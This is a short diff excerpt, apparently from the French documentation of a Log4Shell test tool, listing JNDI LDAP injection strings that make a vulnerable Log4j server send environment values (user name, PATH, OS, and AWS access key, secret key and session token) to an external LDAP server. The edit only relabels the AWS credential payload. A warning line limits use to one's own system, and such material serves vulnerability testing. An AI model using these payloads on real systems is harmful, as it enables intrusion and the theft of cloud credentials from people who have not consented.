@@ -20,5 +20,5 @@ Il ne doit être utilisé que sur votre propre système et uniquement dans un bu
     hello '${jndi:ldap://'"${ldap_server}"'/log=PATH:${env:USER}}'
     hello '${jndi:ldap://'"${ldap_server}"'/log=PATH:${env:PATH}}'
     hello '${jndi:ldap://'"${ldap_server}"'/log=os=${java:os}}'
-    hello '${jndi:ldap://'"${ldap_server}"'/log=AWS_ACCESS_KEY_ID=${env:AWS_ACCESS_KEY_ID},AWS_SECRET_ACCESS_KEY=${env:AWS_SECRET_ACCESS_ID},AWS_SESSION_TOKEN=${env:AWS_SESSION_TOKEN}}'
+    hello '${jndi:ldap://'"${ldap_server}"'/log=aws_credentials,AWS_ACCESS_KEY_ID=${env:AWS_ACCESS_KEY_ID},AWS_SECRET_ACCESS_KEY=${env:AWS_SECRET_ACCESS_ID},AWS_SESSION_TOKEN=${env:AWS_SESSION_TOKEN}}'
     
